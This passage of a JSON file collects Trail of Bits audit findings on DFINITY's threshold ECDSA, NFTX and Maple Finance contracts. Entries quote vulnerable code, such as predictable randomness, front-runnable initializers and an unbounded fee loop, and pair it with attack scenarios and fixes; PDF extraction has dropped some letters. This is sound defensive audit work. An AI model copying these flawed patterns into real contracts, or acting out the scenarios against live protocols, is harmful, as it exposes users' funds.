term, add validation code in EcdsaPreSignerImpl::validate_dealing_support to verify that a signed dealings content hash is identical to the hash of the original dealing. Long term, consider whether the BLS multisignature aggregation APIs need to be better documented to ensure that API consumers verify that all individual signatures are over the same message.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. The ECDSA payload is not updated if a quadruple fails to complete ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "description": "If a transcript fails to complete (as described in TOB-DFTECDSA-1), the corresponding quadruple, Qi, will also fail to complete. This means that the quadruple ID for Qi will remain in the quadruples_in_creation set until the key is reshared and the set is purged. (Currently, the key is reshared if a node joins or leaves the subnet, which is an uncommon occurrence.) Moreover, if a transcript and the corresponding Qi fail to complete, so will the corresponding signing request, SRi, as it is matched deterministically with Qi. let ecdsa_payload = ecdsa::EcdsaPayload { signature_agreements: ecdsa_payload.signature_agreements.clone(), ongoing_signatures: ecdsa_payload.ongoing_signatures.clone(), available_quadruples: if is_new_key_transcript { BTreeMap::new() } else { ecdsa_payload.available_quadruples.clone() }, quadruples_in_creation: if is_new_key_transcript { BTreeMap::new() } else { ecdsa_payload.quadruples_in_creation.clone() }, uid_generator: ecdsa_payload.uid_generator.clone(), idkg_transcripts: BTreeMap::new(), ongoing_xnet_reshares: if is_new_key_transcript { // This will clear the current ongoing reshares, and // the execution requests will be restarted with the // new key and different transcript IDs. BTreeMap::new() } else { ecdsa_payload.ongoing_xnet_reshares.clone() }, xnet_reshare_agreements: ecdsa_payload.xnet_reshare_agreements.clone(), }; Figure 2.1: The quadruples_in_creation set will be purged only when the key is reshared. The canister will never be notied that the signing request failed and will be left waiting indenitely for the corresponding reply from the distributed signing service. Recommendations Short term, revise the code so that if a transcript (permanently) fails to complete, the quadruple ID and corresponding transcripts are dropped from the ECDSA payload. To ensure that a malicious node cannot inuence how signing requests are matched with quadruples, revise the code so that it noties the canister that the signing request failed.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Malicious canisters can exhaust the number of available quadruples ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "description": "By requesting a large number of signatures, a canister (or set of canisters) could exhaust the number of available quadruples, preventing other signature requests from completing in a timely manner. The ECDSA payload builder defaults to creating one extra quadruple in create_data_payload if there is no ECDSA conguration for the subnet in the registry. let ecdsa_config = registry_client .get_ecdsa_config(subnet_id, summary_registry_version)? .unwrap_or(EcdsaConfig { quadruples_to_create_in_advance: 1, // default value ..EcdsaConfig::default() }); Figure 3.1: ic/rs/consensus/src/ecdsa/payload_builder.rs:400-405 Signing requests are serviced by the system in the order in which they are made (as determined by their CallbackID values). If a canister (or set of canisters) makes a large number of signing requests, the system would be overwhelmed and would take a long time to recover. This issue is partly mitigated by the fee that is charged for signing requests. However, we believe that the nancial ramications of this problem could outweigh the fees paid by attackers. For example, the type of denial-of-service attack described in this nding could be devastating for a DeFi application that is sensitive to small price uctuations in the Bitcoin market. Since the ECDSA threshold signature service is not yet deployed on the Internet Computer, it is unclear how the service will be used in practice, making the severity of this issue dicult to determine. Therefore, the severity of this issue is marked as undetermined. Exploit Scenario A malicious canister learns that another canister on the Internet Computer is about to request a time-sensitive signature on a message. The malicious canister immediately requests a large number of signatures from the signing service, exhausting the number of available quadruples and preventing the original signature from completing in a timely manner. Recommendations One possible mitigation is to increase the number of quadruples that the system creates in advance, making it more expensive for an attacker to carry out a denial-of-service attack on the ECDSA signing service. Another possibility is to run multiple signing services on multiple subnets of the Internet Computer. This would have the added benet of protecting the system from resource exhaustion related to cross-network bandwidth limitations. However, both of these solutions scale only linearly with the number of added quadruples/subnets. Another potential mitigation is to introduce a dynamic fee or stake based on the number of outstanding signing requests. In the case of a dynamic fee, the canister would pay a set number of tokens proportional to the number of outstanding signing requests whenever it requests a new signature from the service. In the case of a stake-based system, the canister would stake funds proportional to the number of outstanding requests but would recover those funds once the signing request completed. As any signing service that depends on consensus will have limited throughput compared to a centralized service, this issue is dicult to mitigate completely. However, it is important that canister developers are aware of the limits of the implementation. Therefore, regardless of the mitigations imposed, we recommend that the DFINITY team clearly document the limits of the current implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Aggregated signatures are dropped if their request IDs are not recognized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "description": "The update_signature_agreements function populates the set of completed signatures in the ECDSA payload. The function aggregates the completed signatures from the ECDSA pool by calling EcdsaSignatureBuilderImpl::get_completed_signatures. However, if a signatures associated signing request ID is not in the set of ongoing signatures, update_signature_agreements simply drops the signature. for (request_id, signature) in builder.get_completed_signatures( chain, ecdsa_pool.deref() ) { if payload.ongoing_signatures.remove(&request_id).is_none() { warn!( log, \"ECDSA signing request {:?} is not found in payload but we have a signature for it\", request_id ); } else { payload .signature_agreements .insert(request_id, ecdsa::CompletedSignature::Unreported(signature)); } } Figure 4.1: ic/rs/consensus/src/ecdsa/payload_builder.rs:817-830 Barring an implementation error, this should not happen under normal circumstances. Recommendations Short term, consider adding the signature to the set of completed signatures on the next ECDSA payload. This will ensure that all outstanding signing requests are completed. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Reliance on third-party library for deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "Due to the use of the delegatecall proxy pattern, some NFTX contracts cannot be initialized with their own constructors; instead, they have initializer functions. These functions can be front-run, allowing an attacker to initialize contracts incorrectly. function __NFTXInventoryStaking_init(address _nftxVaultFactory) external virtual override initializer { __Ownable_init(); nftxVaultFactory = INFTXVaultFactory(_nftxVaultFactory); address xTokenImpl = address(new XTokenUpgradeable()); __UpgradeableBeacon__init(xTokenImpl); } Figure 1.1: The initializer function in NFTXInventoryStaking.sol:37-42 The following contracts have initializer functions that can be front-run:  NFTXInventoryStaking  NFTXVaultFactoryUpgradeable  NFTXEligibilityManager  NFTXLPStaking  NFTXSimpleFeeDistributor The NFTX team relies on hardhat-upgrades, a library that oers a series of safety checks for use with certain OpenZeppelin proxy reference implementations to aid in the proxy deployment process. It is important that the NFTX team become familiar with how the hardhat-upgrades library works internally and with the caveats it might have. For example, some proxy patterns like the beacon pattern are not yet supported by the library. Exploit Scenario Bob uses the library incorrectly when deploying a new contract: he calls upgradeTo() and then uses the fallback function to initialize the contract. Eve front-runs the call to the initialization function and initializes the contract with her own address, which results in an incorrect initialization and Eves control over the contract. Recommendations Short term, document the protocols use of the library and the proxy types it supports. Long term, use a factory pattern instead of the initializer functions to prevent front-running of the initializer functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing validation of proxy admin indices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "Multiple functions of the ProxyController contract take an index as an input. The index determines which proxy (managed by the controller) is being targeted. However, the index is never validated, which means that the function will be executed even if the index is out of bounds with respect to the number of proxies managed by the contract (in this case, ve). function changeProxyAdmin(uint256 index, address newAdmin) public onlyOwner { } if (index == 0) { vaultFactoryProxy.changeAdmin(newAdmin); } else if (index == 1) { eligManagerProxy.changeAdmin(newAdmin); } else if (index == 2) { stakingProviderProxy.changeAdmin(newAdmin); } else if (index == 3) { stakingProxy.changeAdmin(newAdmin); } else if (index == 4) { feeDistribProxy.changeAdmin(newAdmin); } emit ProxyAdminChanged(index, newAdmin); Figure 2.1: The changeProxyAdmin function in ProxyController.sol:79-95 In the changeProxyAdmin function, a ProxyAdminChanged event is emitted even if the supplied index is out of bounds (gure 2.1). Other ProxyController functions return the zero address if the index is out of bounds. For example, getAdmin() should return the address of the targeted proxys admin. If getAdmin() returns the zero address, the caller cannot know whether she supplied the wrong index or whether the targeted proxy simply has no admin. function getAdmin(uint256 index) public view returns (address admin) { if (index == 0) { return vaultFactoryProxy.admin(); } else if (index == 1) { return eligManagerProxy.admin(); } else if (index == 2) { return stakingProviderProxy.admin(); } else if (index == 3) { return stakingProxy.admin(); } else if (index == 4) { return feeDistribProxy.admin(); } } Figure 2.2: The getAdmin function in ProxyController.sol:38-50 Exploit Scenario A contract relying on the ProxyController contract calls one of the view functions, like getAdmin(), with the wrong index. The function is executed normally and implicitly returns zero, leading to unexpected behavior. Recommendations Short term, document this behavior so that clients are aware of it and are able to include safeguards to prevent unanticipated behavior. Long term, consider adding an index check to the aected functions so that they revert if they receive an out-of-bounds index.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Random token withdrawals can be gamed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "The algorithm used to randomly select a token for withdrawal from a vault is deterministic and predictable. function getRandomTokenIdFromVault() internal virtual returns (uint256) { uint256 randomIndex = uint256( keccak256( abi.encodePacked( blockhash(block.number - 1), randNonce, block.coinbase, block.difficulty, block.timestamp ) ) ) % holdings.length(); ++randNonce; return holdings.at(randomIndex); } Figure 3.1: The getRandomTokenIdFromVault function in NFTXVaultUpgradable.sol:531-545 All the elements used to calculate randomIndex are known to the caller (gure 3.1). Therefore, a contract calling this function can predict the resulting token before choosing to execute the withdrawal. This nding is of high diculty because NFTXs vault economics incentivizes users to deposit tokens of equal value. Moreover, the cost of deploying a custom exploit contract will likely outweigh the fee savings of choosing a token at random for withdrawal. Exploit Scenario Alice wishes to withdraw a specic token from a vault but wants to pay the lower random redemption fee rather than the higher target redemption fee. She deploys a contract that checks whether the randomly chosen token is her target and, if so, automatically executes the random withdrawal. Recommendations Short term, document the risks described in this nding so that clients are aware of them. Long term, consider removing all randomness from NFTX.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Duplicate receivers allowed by addReceiver() ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "The NFTXSimpleFeeDistributor contract is in charge of protocol fee distribution. To facilitate the fee distribution process, it allows the contract owner (the NFTX DAO) to manage a list of fee receivers. To add a new fee receiver to the contract, the owner calls the addReceiver() function. function addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) external override virtual onlyOwner { _addReceiver(_allocPoint, _receiver, _isContract); } Figure 4.1: The addReceiver() function in NFTXSimpleFeeDistributor This function in turn executes the internal logic that pushes a new receiver to the receiver list. function _addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) internal virtual { FeeReceiver memory _feeReceiver = FeeReceiver(_allocPoint, _receiver, _isContract); feeReceivers.push(_feeReceiver); allocTotal += _allocPoint; emit AddFeeReceiver(_receiver, _allocPoint); } Figure 4.2: The _addReceiver() function in NFTXSimpleFeeDistributor However, the function does not check whether the receiver is already in the list. Without this check, receivers can be accidentally added multiple times to the list, which would increase the amount of fees they receive. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a DAO proposal has to be created and a certain quorum has to be met for it to be executed. Exploit Scenario A proposal is created to add a new receiver to the fee distributor contract. The receiver address was already added, but the DAO members are not aware of this. The proposal passes, and the receiver is added. The receiver gains more fees than he is entitled to. Recommendations Short term, document this behavior so that the NFTX DAO is aware of it and performs the adequate checks before adding a new receiver. Long term, consider adding a duplicate check to the _addReceiver() function.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. OpenZeppelin vulnerability can break initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "NFTX extensively uses OpenZeppelin v3.4.1. A bug was recently discovered in all OpenZeppelin versions prior to v4.4.1 that aects initializer functions invoked separately during contract creation: the bug causes the contract initialization modier to fail to prevent reentrancy to the initializers (see CVE-2021-46320). Currently, no external calls to untrusted code are made during contract initialization. However, if the NFTX team were to add a new feature that requires such calls to be made, it would have to add the necessary safeguards to prevent reentrancy. Exploit Scenario An NFTX contract initialization function makes a call to an external contract that calls back to the initializer with dierent arguments. The faulty OpenZeppelin initializer modier fails to prevent this reentrancy. Recommendations Short term, upgrade OpenZeppelin to v4.4.1 or newer. Long term, integrate a dependency checking tool like Dependabot into the NFTX CI process.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Potentially excessive gas fees imposed on users for protocol fee distribution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. function _chargeAndDistributeFees(address user, uint256 amount) internal virtual { // Do not charge fees if the zap contract is calling // Added in v1.0.3. Changed to mapping in v1.0.5. INFTXVaultFactory _vaultFactory = vaultFactory; if (_vaultFactory.excludedFromFees(msg.sender)) { return; } // Mint fees directly to the distributor and distribute. if (amount > 0) { address feeDistributor = _vaultFactory.feeDistributor(); // Changed to a _transfer() in v1.0.3. _transfer(user, feeDistributor, amount); INFTXFeeDistributor(feeDistributor).distribute(vaultId); } } Figure 6.1: The _chargeAndDistributeFees() function in NFTXVaultUpgradeable.sol After the fee is sent to the NFXTSimpleFeeDistributor contract, the distribute() function is then called to distribute all accrued fees. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 6.2: The distribute() function in NFTXSimpleFeeDistributor.sol If the token balance of the contract is low enough (but not zero), the number of tokens distributed to each receiver (amountToSend) will be close to zero. Ultimately, this can disincentivize the use of the protocol, regardless of the number of tokens distributed. Users have to pay the gas fee for the fee distribution operation, the gas fees for the token operations (e.g., redeeming, minting, or swapping), and the protocol fees themselves. Exploit Scenario Alice redeems a token from a vault, pays the necessary protocol fee, sends it to the NFTXSimpleFeeDistributor contract, and calls the distribute() function. Because the balance of the distributor contract is very low (e.g., $0.50), Alice has to pay a substantial amount in gas to distribute a near-zero amount in fees between all fee receiver addresses. Recommendations Short term, add a requirement for a minimum balance that the NFTXSimpleFeeDistributor contract should have for the distribution operation to execute. Alternatively, implement a periodical distribution of fees (e.g., once a day or once every number of blocks). Long term, consider redesigning the fee distribution mechanism to prevent the distribution of small fees. Also consider whether protocol users should pay for said distribution. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Risk of denial of service due to unbounded loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "When protocol fees are distributed, the system loops through the list of beneciaries (known internally as receivers) to send them the protocol fees they are entitled to. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 7.1: The distribute() function in NFTXSimpleFeeDistributor.sol Because this loop is unbounded and the number of receivers can grow, the amount of gas consumed is also unbounded. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 7.2: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol Additionally, if one of the receivers is a contract, code that signicantly increases the gas cost of the fee distribution will execute (gure 7.2). It is important to note that fees are usually distributed within the context of user transactions (redeeming, minting, etc.), so the total cost of the distribution operation depends on the logic outside of the distribute() function. Exploit Scenario The NFTX team adds a new feature that allows NFTX token holders who stake their tokens to register as receivers and gain a portion of protocol fees; because of that, the number of receivers grows dramatically. Due to the large number of receivers, the distribute() function cannot execute because the cost of executing it has reached the block gas limit. As a result, users are unable to mint, redeem, or swap tokens. Recommendations Short term, examine the execution cost of the function to determine the safe bounds of the loop and, if possible, consider splitting the distribution operation into multiple calls. Long term, consider redesigning the fee distribution mechanism to avoid unbounded loops and prevent denials of service. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. A malicious fee receiver can cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. The distribution function loops through all fee receivers and sends them the number of tokens they are entitled to (see gure 7.1). If the fee receiver is a contract, a special logic is executed; instead of receiving the corresponding number of tokens, the receiver pulls all the tokens from the NFXTSimpleFeeDistributor contract. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 8.1: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol In this case, because the receiver contract executes arbitrary logic and receives all of the gas, the receiver contract can spend all of it; as a result, only 1/64 of the original gas forwarded to the receiver contract would remain to continue executing the distribute() function (see EIP-150), which may not be enough to complete the execution, leading to a denial of service. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a proposal is created and a certain quorum has to be met for it to be executed. Exploit Scenario Eve, a malicious receiver, sets up a smart contract that consumes all the gas forwarded to it when receiveRewards is called. As a result, the distribute() function runs out of gas, causing a denial of service on the vaults calling the function. Recommendations Short term, change the fee distribution mechanism so that only a token transfer is executed even if the receiver is a contract. Long term, consider redesigning the fee distribution mechanism to prevent malicious fee receivers from causing a denial of service on the protocol. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Vault managers can grief users ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "The process of creating vaults in the NFTX protocol is trustless. This means that anyone can create a new vault and use any asset as the underlying vault NFT. The user calls the NFTXVaultFactoryUpgradeable contract to create a new vault. After deploying the new vault, the contract sets the user as the vault manager. Vault managers can disable certain vault features (gure 9.1) and change vault fees (gure 9.2). function setVaultFeatures( bool _enableMint, bool _enableRandomRedeem, bool _enableTargetRedeem, bool _enableRandomSwap, bool _enableTargetSwap ) public override virtual { onlyPrivileged(); enableMint = _enableMint; enableRandomRedeem = _enableRandomRedeem; enableTargetRedeem = _enableTargetRedeem; enableRandomSwap = _enableRandomSwap; enableTargetSwap = _enableTargetSwap; emit EnableMintUpdated(_enableMint); emit EnableRandomRedeemUpdated(_enableRandomRedeem); emit EnableTargetRedeemUpdated(_enableTargetRedeem); emit EnableRandomSwapUpdated(_enableRandomSwap); emit EnableTargetSwapUpdated(_enableTargetSwap); } Figure 9.1: The setVaultFeatures() function in NFTXVaultUpgradeable.sol function setFees( uint256 _mintFee, uint256 _randomRedeemFee, uint256 _targetRedeemFee, uint256 _randomSwapFee, uint256 _targetSwapFee ) public override virtual { onlyPrivileged(); vaultFactory.setVaultFees( vaultId, _mintFee, _randomRedeemFee, _targetRedeemFee, _randomSwapFee, _targetSwapFee ); } Figure 9.2: The setFees() function in NFTXVaultUpgradeable.sol The eects of these functions are instantaneous, which means users may not be able to react in time to these changes and exit the vaults. Additionally, disabling vault features with the setVaultFeatures() function can trap tokens in the contract. Ultimately, this risk is related to the trustless nature of vault creation, but the NFTX team can take certain measures to minimize the eects. One such measure, which is already in place, is vault verication, in which the vault manager calls the finalizeVault() function to pass her management rights to the zero address. This function then gives the veried status to the vault in the NFTX web application. Exploit Scenario Eve, a malicious manager, creates a new vault for a popular NFT collection. After it gains some user traction, she unilaterally changes the vault fees to the maximum (0.5 ether), which forces users to either pay the high fee or relinquish their tokens. Recommendations Short term, document the risks of interacting with vaults that have not been nalized (i.e., vaults that have managers). Long term, consider adding delays to manager-only functionality (e.g., a certain number of blocks) so that users have time to react and exit the vault.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of zero address check in functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "description": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. This issue aects the following contracts and functions:  NFTXInventoryStaking.sol  __NFTXInventoryStaking_init()  NFTXSimpleFeeDistributor.sol  setInventoryStakingAddress()  addReceiver()  changeReceiverAddress()  RewardDistributionToken  __RewardDistributionToken_init() Exploit Scenario Alice deploys a new version of the NFTXInventoryStaking contract. When she initializes the proxy contract, she inputs the zero address as the address of the _nftxVaultFactory state variable, leading to an incorrect initialization. Recommendations Short term, add zero-value checks on all function arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero checks. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Incorrect argument passed to _getPlatformOriginationFee ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The getOriginationFees function incorrectly uses msg.sender instead of the loan_ parameter. As a result, it returns an incorrect result to users who want to know how much a loan is paying in origination fees. function getOriginationFees(address loan_, uint256 principalRequested_) external view override returns (uint256 originationFees_) { originationFees_ = _getPlatformOriginationFee(msg.sender, principalRequested_) + delegateOriginationFee[msg.sender]; } Figure 1.1: getOriginationFees function (loan/contracts/MapleLoanFeeManager.sol#147-149) Exploit Scenario Bob, a borrower, wants to see how much his loan is paying in origination fees. He calls getOriginationFees but receives an incorrect result that does not correspond to what the loan actually pays. Recommendations Short term, correct the getOriginationFees function to use loan_ instead of msg.sender. Long term, add tests for view functions that are not used inside the protocol but are intended for the end-users.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. The protocol could stop working prematurely ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The _uint48 function is incorrectly implemented such that it requires the input to be less than or equal to type(uint32).max instead of type(uint48).max. This could lead to the incorrect reversion of successful executions. function _uint48(uint256 input_) internal pure returns (uint32 output_) { require(input_ <= type(uint32).max, \"LM:UINT32_CAST_OOB\"); output_ = uint32(input_); } Figure 2.1: _uint48 function (pool-v2/contracts/LoanManager.sol#774-777) The function is mainly used to keep track of when each loans payment starts and when it is due. All variables for which the result of _uint48 is assigned are eectively of uint48 type. Exploit Scenario The protocol stops working when we reach a block.timestamp value of type(uint32).max instead of the expected behavior to work until the block.timestamp reaches a value of type(uint48).max. Recommendations Short term, correct the _uint48 implementation by checking that the input_ is less than the type(uint48).max and that it returns an uint48 type. Long term, improve the unit-tests to account for extreme but valid states that the protocol supports. 3. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-MPL-3 Target: globals-v2/contracts/MapleGlobals.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Incorrect GovernorshipAccepted event argument ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The MapleGlobals contract emits the GovernorshipAccepted event with an incorrect previous owner value. MapleGlobals implements a two-step process for ownership transfer in which the current owner has to set the new governor, and then the new governor has to accept it. The acceptGovernor function rst sets the new governor with _setAddress and then emits the GovernorshipAccepted event with the rst argument dened as the old governor and the second the new one. However, because the admin() function returns the current value of the governor, both arguments will be the new governor. function acceptGovernor() external { require(msg.sender == pendingGovernor, \"MG:NOT_PENDING_GOVERNOR\"); _setAddress(ADMIN_SLOT, msg.sender); pendingGovernor = address(0); emit GovernorshipAccepted(admin(), msg.sender); } Figure 4.1: acceptGovernor function (globals-v2/contracts/MapleGlobals.sol#87-92) Exploit Scenario The Maple team decides to transfer the MapleGlobals governor to a new multi-signature wallet. The team has a script that veries the correct execution by checking the events emitted; however, this script creates a false alert because the GovernorshipAccepted event does not have the expected arguments. Recommendations Short term, emit the GovernorshipAccepted event before calling _setAddress. Long term, add tests to check the events have the expected arguments.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Partially incorrect Chainlink price feed safety checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The getLatestPrice function retrieves a specic asset price from Chainlink. However, the price (a signed integer) is rst checked that it is non-zero and then is cast to an unsigned integer with a potentially negative value. An incorrect price would temporarily aect the expected amount of fund assets during liquidation. function getLatestPrice(address asset_) external override view returns (uint256 latestPrice_) { // If governor has overridden price because of oracle outage, return overridden price. if (manualOverridePrice[asset_] != 0) return manualOverridePrice[asset_]; ( uint80 roundId_, int256 price_, , uint256 updatedAt_, uint80 answeredInRound_ ) = IChainlinkAggregatorV3Like(oracleFor[asset_]).latestRoundData(); require(updatedAt_ != 0, \"MG:GLP:ROUND_NOT_COMPLETE\"); require(answeredInRound_ >= roundId_, \"MG:GLP:STALE_DATA\"); require(price_ != int256(0), \"MG:GLP:ZERO_PRICE\"); latestPrice_ = uint256(price_); } Figure 5.1: getLatestPrice function (globals-v2/contracts/MapleGlobals.sol#297-308) Exploit Scenario Chainlinks oracle returns a negative value for an in-process liquidation. This value is then unsafely cast to an uint256. The expected amount of fund assets from the protocol is incorrect, which prevents liquidation. Recommendations Short term, check that the price is greater than 0. Long term, add tests for the Chainlink price feed with various edge cases. Additionally, set up a monitoring system in the event of unexpected market failures. A Chainlink oracle can have a minimum and maximum value, and if the real price is outside of that range, it will not be possible to update the oracle; as a result, it will report an incorrect price, and it will be impossible to know this on-chain.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Incorrect implementation of EIP-4626 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
